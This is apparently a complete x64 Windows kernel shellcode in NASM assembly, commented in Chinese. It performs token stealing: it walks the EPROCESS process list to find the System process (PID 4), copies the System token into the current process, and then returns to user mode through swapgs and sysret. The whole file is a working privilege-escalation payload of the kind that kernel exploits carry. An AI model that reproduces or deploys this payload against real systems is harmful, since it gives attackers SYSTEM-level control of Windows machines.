[Bits 64]

;
; 在内核通过Eprocess进行Token的生成
;

_start:    
    xor rax, rax
    mov rax, gs:[rax+0x188]
    mov rax, [rax+0xb8]     ;rax = 当前EPROCESS
    mov r9, rax             ;r9  = 当前EPROCESS
    mov rax, [rax+0x448]    ;rax = 当前EPROCESS.List
    mov rax, [rax]          ;rax = 当前EPROCESS.List->flink

__loop:
    mov rdx, [rax-0x8]      ;rdx = 上一个进程的 upid
    mov r8, rax             ;r8  = 当前EPROCESS.List->flink
    mov rax, [rax]          ;rax = 上一个进程的.List
    cmp rdx, 0x4
    jnz __loop

    ;rdx = 4
    ;r8 = System EPROCESS
    mov rdx, [r8+0x70]      ;rdx = system token
    and rdx, -0x8           ;消除低4位
    mov rcx, [r9+0x4b8]     ;当前EPROCESS的token
    and rcx, 0x7            ;
    add rdx, rcx            ;rdx = 系统token高位+当前token低4位
    mov [r9+0x4b8], rdx     ;将合成的token复制给当前

    ;资源回收部分
    mov rax, gs:[0x188]     ;回收资源
    mov cx, [rax+0x1e4]
    inc cx
    mov [rax+0x1e4], cx
    mov rdx, [rax+0x90]
    mov rcx, [rdx+0x168]
    mov r11, [rdx+0x178]
    mov rsp, [rdx+0x180]
    mov rbp, [rdx+0x158]
    xor eax, eax
    
    swapgs  
    o64. sysret 
    ;或者依据其他情况进行回收